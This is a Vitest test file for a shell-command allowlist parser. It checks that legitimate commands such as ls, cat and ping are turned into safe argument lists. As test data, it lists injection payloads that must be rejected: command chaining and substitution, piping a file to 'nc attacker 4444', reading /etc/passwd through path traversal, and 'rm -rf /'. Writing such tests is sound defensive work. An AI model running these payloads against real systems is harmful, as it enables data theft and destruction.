import { describe, expect, it } from "vitest";
import { parseCommand } from "@/lib/commandPolicy";

describe("command injection payloads are blocked", () => {
  const attacks: [string, string][] = [
    ["ls; whoami", "char-allowlist"],
    ["ls && id", "char-allowlist"],
    ["ls || id", "char-allowlist"],
    ["cat notes.txt | nc attacker 4444", "char-allowlist"],
    ["echo $(whoami)", "char-allowlist"],
    ["echo `id`", "char-allowlist"],
    ["echo ${HOME}", "char-allowlist"],
    ["ls > out.txt", "char-allowlist"],
    ["cat < /etc/passwd", "char-allowlist"],
    ["ls\nwhoami", "char-allowlist"],
    ["ls\r\nid", "char-allowlist"],
    ["ls *", "char-allowlist"],
    ["cat 'notes.txt'", "char-allowlist"],
    ["ls\u0000id", "char-allowlist"],
    ["rm -rf /", "command-allowlist"],
    ["bash -c id", "command-allowlist"],
    ["cat ../../../../etc/passwd", "sandbox-path"],
    ["cat /etc/passwd", "sandbox-path"],
    ["ls /", "sandbox-path"],
    ["ls --color=always", "flag-allowlist"],
    ["ls -R", "flag-allowlist"],
    ["cat -n notes.txt", "flag-allowlist"],
    ["ping -f 127.0.0.1", "arg-shape"],
    ["ping -c 1000 127.0.0.1", "bounded-number"],
    ["ping --help", "hostname-format"],
    ["ping 127.0.0.1 -c 1000", "arg-shape"],
    ["whoami root", "no-args"],
    ["constructor", "command-allowlist"],
    ["__proto__", "command-allowlist"],
  ];

  it.each(attacks)("%s  ->  %s", (payload, rule) => {
    const r = parseCommand(payload);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.rule).toBe(rule);
  });

  it("rejects over-long input and non-strings", () => {
    expect(parseCommand("echo " + "a".repeat(300)).ok).toBe(false);
    expect(parseCommand({ command: "ls" }).ok).toBe(false);
    expect(parseCommand(undefined).ok).toBe(false);
  });
});

describe("legitimate commands are allowed and turned into safe argv", () => {
  it("ls with flags and sandbox path adds '--' before paths", () => {
    const r = parseCommand("ls -l docs");
    expect(r).toEqual({ ok: true, command: { kind: "external", name: "ls", args: ["-l", "--", "docs"] } });
  });

  it("cat a sandbox file", () => {
    const r = parseCommand("cat notes.txt");
    expect(r.ok && r.command.args).toEqual(["--", "notes.txt"]);
  });

  it("ping gets a bounded count", () => {
    const r = parseCommand("ping example.com");
    expect(r.ok && r.command.args).toEqual(["-c", "2", "example.com"]);
    const r2 = parseCommand("ping -c 3 10.0.0.1");
    expect(r2.ok && r2.command.args).toEqual(["-c", "3", "10.0.0.1"]);
  });

  it("builtins never spawn a process", () => {
    const r = parseCommand("echo hello world");
    expect(r.ok && r.command.kind).toBe("builtin");
  });
});
